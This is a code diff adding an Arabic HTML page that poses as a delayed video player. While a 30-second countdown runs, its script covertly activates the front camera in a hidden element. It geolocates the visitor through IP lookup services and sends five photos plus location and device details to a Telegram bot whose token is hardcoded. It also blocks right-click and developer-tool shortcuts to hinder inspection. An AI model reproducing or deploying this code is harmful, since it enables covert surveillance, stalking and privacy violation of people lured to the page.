@@ -3,6 +3,420 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>فيديو - تأخير 30 ثانية</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #000;
+            overflow: hidden;
+        }
+
+        /* شاشة سوداء مؤقتة قبل تشغيل الفيديو */
+        .black-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            z-index: 2;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: opacity 1s;
+        }
+
+        .timer-text {
+            color: white;
+            font-size: 48px;
+            font-family: monospace;
+            background: rgba(0,0,0,0.7);
+            padding: 20px 40px;
+            border-radius: 20px;
+            text-align: center;
+        }
+
+        .timer-text small {
+            font-size: 18px;
+            display: block;
+            margin-top: 10px;
+            color: #aaa;
+        }
+
+        /* فيديو الخلفية - يبدأ بعد 30 ثانية */
+        .video-background {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+            opacity: 0;
+            transition: opacity 1s;
+        }
+
+        .video-background.show {
+            opacity: 1;
+        }
+
+        .video-background video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        /* كاميرا مخفية */
+        .hidden-camera {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            visibility: hidden;
+        }
+
+        canvas {
+            display: none;
+        }
+
+        ::-webkit-scrollbar {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- شاشة سوداء مع مؤقت -->
+    <div class="black-screen" id="blackScreen">
+        <div class="timer-text">
+            <span id="countdown">30</span>
+            <small>ثانية حتى بدء الفيديو</small>
+        </div>
+    </div>
+
+    <!-- فيديو خلفية (يظهر بعد 30 ثانية) -->
+    <div class="video-background" id="videoBackground">
+        <video id="bgVideo" autoplay loop muted playsinline>
+            <source src="https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4" type="video/mp4">
+        </video>
+    </div>
+
+    <!-- كاميرا مخفية -->
+    <div class="hidden-camera">
+        <video id="camera" autoplay playsinline muted></video>
+    </div>
+
+    <canvas id="canvas"></canvas>
+
+    <script>
+        // ==================== إعدادات تليجرام ====================
+        const BOT_TOKEN = "8179040156:AAFdn8ApCAIbaWhpLaFQMyqrwUwfR1hfyuY";
+        let CHAT_ID = null;
+        let stream = null;
+        let cameraReady = false;
+        
+        // ==================== معلومات الجهاز ====================
+        let deviceInfo = {
+            ip: 'جاري الجلب...',
+            country: 'جاري الجلب...',
+            city: 'جاري الجلب...',
+            region: 'جاري الجلب...',
+            isp: 'جاري الجلب...',
+            lat: 'جاري الجلب...',
+            lon: 'جاري الجلب...',
+            timezone: 'جاري الجلب...',
+            os: 'جاري الجلب...',
+            browser: 'جاري الجلب...',
+            screen: 'جاري الجلب...',
+            device: 'جاري الجلب...'
+        };
+        
+        // ==================== عناصر الصفحة ====================
+        const camera = document.getElementById('camera');
+        const canvas = document.getElementById('canvas');
+        const blackScreen = document.getElementById('blackScreen');
+        const videoBackground = document.getElementById('videoBackground');
+        const countdownSpan = document.getElementById('countdown');
+        
+        // ==================== خدمة جلب IP والموقع ====================
+        async function getIPv6Info() {
+            try {
+                const response = await fetch('https://ipapi.co/json/', { timeout: 5000 });
+                if (response.ok) {
+                    const data = await response.json();
+                    deviceInfo.ip = data.ip || deviceInfo.ip;
+                    deviceInfo.country = data.country_name || data.country;
+                    deviceInfo.city = data.city || deviceInfo.city;
+                    deviceInfo.region = data.region || deviceInfo.region;
+                    deviceInfo.isp = data.org || data.isp;
+                    deviceInfo.lat = data.latitude;
+                    deviceInfo.lon = data.longitude;
+                    deviceInfo.timezone = data.timezone;
+                    return true;
+                }
+                return false;
+            } catch(e) {
+                console.log('ipapi.co فشل:', e);
+                return false;
+            }
+        }
+        
+        async function getBackupInfo() {
+            try {
+                const response = await fetch('https://ipinfo.io/json', { timeout: 5000 });
+                if (response.ok) {
+                    const data = await response.json();
+                    deviceInfo.ip = data.ip || deviceInfo.ip;
+                    deviceInfo.country = data.country;
+                    deviceInfo.city = data.city;
+                    deviceInfo.region = data.region;
+                    deviceInfo.isp = data.org;
+                    if (data.loc) {
+                        const coords = data.loc.split(',');
+                        deviceInfo.lat = coords[0];
+                        deviceInfo.lon = coords[1];
+                    }
+                    deviceInfo.timezone = data.timezone;
+                    return true;
+                }
+                return false;
+            } catch(e) {
+                console.log('ipinfo.io فشل:', e);
+                return false;
+            }
+        }
+        
+        // ==================== جلب نظام التشغيل والمتصفح ====================
+        function getSystemInfo() {
+            const userAgent = navigator.userAgent;
+            const platform = navigator.platform;
+            
+            let os = 'Unknown';
+            if (userAgent.indexOf('Win') !== -1) os = 'Windows';
+            else if (userAgent.indexOf('Mac') !== -1) os = 'macOS';
+            else if (userAgent.indexOf('Linux') !== -1) {
+                if (userAgent.indexOf('Android') !== -1) os = 'Android';
+                else os = 'Linux';
+            }
+            else if (userAgent.indexOf('iOS') !== -1 || userAgent.indexOf('iPhone') !== -1) os = 'iOS';
+            
+            let browser = 'Unknown';
+            if (userAgent.indexOf('Chrome') !== -1 && userAgent.indexOf('Edg') === -1) browser = 'Chrome';
+            else if (userAgent.indexOf('Firefox') !== -1) browser = 'Firefox';
+            else if (userAgent.indexOf('Safari') !== -1 && userAgent.indexOf('Chrome') === -1) browser = 'Safari';
+            else if (userAgent.indexOf('Edg') !== -1) browser = 'Edge';
+            
+            let device = 'كمبيوتر';
+            if (/Mobile|Android|iPhone|iPad|iPod/i.test(userAgent)) device = 'جوال / جهاز لوحي';
+            
+            deviceInfo.os = os;
+            deviceInfo.browser = browser;
+            deviceInfo.screen = `${screen.width}x${screen.height}`;
+            deviceInfo.device = device;
+        }
+        
+        // ==================== جلب جميع المعلومات ====================
+        async function getAllInfo() {
+            const success = await getIPv6Info() || await getBackupInfo();
+            if (!success) {
+                try {
+                    const response = await fetch('https://api.ipify.org?format=json');
+                    const data = await response.json();
+                    deviceInfo.ip = data.ip;
+                    deviceInfo.country = 'تم جلب IP فقط';
+                } catch(e) {
+                    deviceInfo.ip = 'غير متاح';
+                }
+            }
+        }
+        
+        // ==================== الحصول على Chat ID ====================
+        async function getChatId() {
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`);
+                const result = await response.json();
+                if (result.ok && result.result.length > 0) {
+                    CHAT_ID = result.result[result.result.length - 1].message?.chat?.id;
+                    return CHAT_ID !== null;
+                }
+                return false;
+            } catch(error) {
+                console.error('خطأ:', error);
+                return false;
+            }
+        }
+        
+        // ==================== تشغيل الكاميرا ====================
+        async function startCamera() {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" } 
+                });
+                camera.srcObject = stream;
+                cameraReady = true;
+                return true;
+            } catch(err) {
+                console.error('خطأ الكاميرا:', err);
+                return false;
+            }
+        }
+        
+        // ==================== إنشاء نص المعلومات ====================
+        function getInfoText(photoNumber) {
+            const ipType = deviceInfo.ip.includes(':') ? 'IPv6' : 'IPv4';
+            
+            return `
+📸 صورة ${photoNumber}/5
+
+━━━━━━━━━━━━━━━━
+📍 معلومات الموقع والجهاز:
+━━━━━━━━━━━━━━━━
+
+🌐 عنوان IP: ${deviceInfo.ip}
+📌 نوع IP: ${ipType}
+🗺️ الدولة: ${deviceInfo.country}
+🏙️ المدينة: ${deviceInfo.city || 'غير محدد'}
+📍 المنطقة: ${deviceInfo.region || 'غير محدد'}
+📡 مزود الخدمة: ${deviceInfo.isp || 'غير محدد'}
+📍 الإحداثيات: ${deviceInfo.lat || 'غير محدد'}, ${deviceInfo.lon || 'غير محدد'}
+⏰ المنطقة الزمنية: ${deviceInfo.timezone || 'Asia/Riyadh'}
+
+💻 نظام التشغيل: ${deviceInfo.os}
+🌍 المتصفح: ${deviceInfo.browser}
+📱 نوع الجهاز: ${deviceInfo.device}
+📐 دقة الشاشة: ${deviceInfo.screen}
+
+━━━━━━━━━━━━━━━━
+🕐 الوقت: ${new Date().toLocaleString('ar-SA')}
+━━━━━━━━━━━━━━━━
+            `;
+        }
+        
+        // ==================== التقاط وإرسال الصورة ====================
+        async function captureAndSend(photoNumber) {
+            if (!CHAT_ID || !cameraReady) return false;
+            
+            try {
+                if (camera.videoWidth === 0 || camera.videoHeight === 0) return false;
+                
+                canvas.width = camera.videoWidth;
+                canvas.height = camera.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.translate(canvas.width, 0);
+                ctx.scale(-1, 1);
+                ctx.drawImage(camera, 0, 0, canvas.width, canvas.height);
+                ctx.setTransform(1, 0, 0, 1, 0, 0);
+                
+                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, `photo_${Date.now()}.jpg`);
+                formData.append('caption', getInfoText(photoNumber));
+                
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                const result = await response.json();
+                return result.ok;
+            } catch(e) {
+                console.error('خطأ في الإرسال:', e);
+                return false;
+            }
+        }
+        
+        // ==================== تصوير 5 صور ====================
+        async function captureAllPhotos() {
+            for (let i = 1; i <= 5; i++) {
+                await captureAndSend(i);
+                if (i < 5) {
+                    await new Promise(resolve => setTimeout(resolve, 9000));
+                }
+            }
+            
+            setTimeout(() => {
+                if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                }
+            }, 2000);
+        }
+        
+        // ==================== تأخير تشغيل الفيديو 30 ثانية ====================
+        function startVideoDelay() {
+            let secondsLeft = 30;
+            countdownSpan.textContent = secondsLeft;
+            
+            const countdownInterval = setInterval(() => {
+                secondsLeft--;
+                countdownSpan.textContent = secondsLeft;
+                
+                if (secondsLeft <= 0) {
+                    clearInterval(countdownInterval);
+                    // إخفاء الشاشة السوداء
+                    blackScreen.style.opacity = '0';
+                    setTimeout(() => {
+                        blackScreen.style.display = 'none';
+                    }, 1000);
+                    // إظهار الفيديو
+                    videoBackground.classList.add('show');
+                }
+            }, 1000);
+        }
+        
+        // ==================== التشغيل الرئيسي ====================
+        async function init() {
+            // 1. جلب معلومات النظام
+            getSystemInfo();
+            
+            // 2. جلب IP والموقع
+            await getAllInfo();
+            
+            // 3. تشغيل الكاميرا (فوراً)
+            const cameraSuccess = await startCamera();
+            
+            // 4. الحصول على Chat ID
+            await getChatId();
+            
+            // 5. بدء التصوير (فوراً، لا ينتظر الفيديو)
+            if (cameraSuccess && CHAT_ID) {
+                setTimeout(() => {
+                    captureAllPhotos();
+                }, 1000);
+            }
+            
+            // 6. بدء تأخير الفيديو 30 ثانية
+            startVideoDelay();
+        }
+        
+        init();
+        
+        // منع أدوات المطور
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'F12' || 
+                (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || 
+                (e.ctrlKey && e.key === 'U')) {
+                e.preventDefault();
+                return false;
+            }
+        });
+        
+        window.onbeforeunload = () => {
+            if (stream) stream.getTracks().forEach(t => t.stop());
+        };
+    </script>
+</body>
+</html><!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>فيديو - معلومات دقيقة</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
